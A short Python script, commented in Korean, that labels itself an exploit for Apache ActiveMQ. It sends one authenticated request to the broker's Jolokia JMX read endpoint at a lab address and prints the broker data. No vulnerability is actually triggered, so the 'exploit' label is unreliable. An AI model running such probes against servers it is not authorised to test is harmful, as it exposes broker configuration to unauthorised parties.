import requests
from requests.auth import HTTPBasicAuth

# Apache ActiveMQ 인스턴스 URL
activemq_url = "http://192.168.56.1:8161/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost"

# 사용자 인증 정보
username = ''
password = ''

# 취약점 익스플로잇 함수
def exploit_activemq(url, user, pwd):
    try:
        response = requests.get(url, auth=HTTPBasicAuth(user, pwd))
        if response.status_code == 200:
            print("[+] 인증을 통해 Jolokia JMX REST API에 성공적으로 접근했습니다.")
            print("[+] 응답 데이터:")
            print(response.json())
        elif response.status_code == 401:
            print("[-] 인증이 필요합니다.")
        else:
            print(f"[-] 예상치 못한 상태 코드: {response.status_code}")
    except Exception as e:
        print(f"[-] 오류: {str(e)}")

# 익스플로잇 실행
if __name__ == "__main__":
    exploit_activemq(activemq_url, username, password)
